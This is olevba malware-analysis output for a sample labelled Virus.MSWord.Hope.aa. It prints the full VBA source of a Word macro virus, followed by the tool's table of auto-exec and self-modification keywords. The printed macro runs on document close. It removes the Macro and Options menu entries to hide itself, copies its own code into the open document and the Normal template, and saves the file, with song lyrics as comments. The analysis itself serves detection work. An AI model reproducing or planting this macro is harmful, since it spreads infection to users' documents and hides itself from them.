olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Hope.aa
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Hope.aa - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()

End Sub

    Set prevDocument = ActiveDocument
    Set nextDocument = NormalTemplate
Private Sub Document_Close(): On Error Resume Next
'in time cry the hollow words to sing with false disguise smothered
    Set prevDocument = NormalTemplate
    Set nextDocument = newDocument
CommandBars("Tools").Controls("Macro").Delete: CommandBars("Tools").Controls("Options...").Delete
'to know anymore life shifts up and down everybody knows it's wrong
Set CM = MacroContainer.VBProject.VBComponents.Item(1).codemodule
'why don't you care? now do it seem fair? it's not in the rhyme or
Set Ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule
'reason so it goes with every season crawl to top fall through
Set nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule
'bottom first hand love is really rotten slice of life find what's
MC = CM.Lines(1, CM.CountOfLines)
'plenty inch towards a sanctuary light with me inside the womb i
Ad.deletelines 1, Ad.CountOfLines: Ad.AddFromString MC
'know everyone everybody knows it's me it's my voice, my voice
nt.deletelines 1, nt.CountOfLines: nt.AddFromString MC
'cries out obscenity sightless eye regard my past sometimes it
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'should i just don't want to know anymore.
End Sub
'NoHope~By~Lys~KovicK Lyrics From Smothered Hope(Skinny Puppy)

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |newDocument         |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

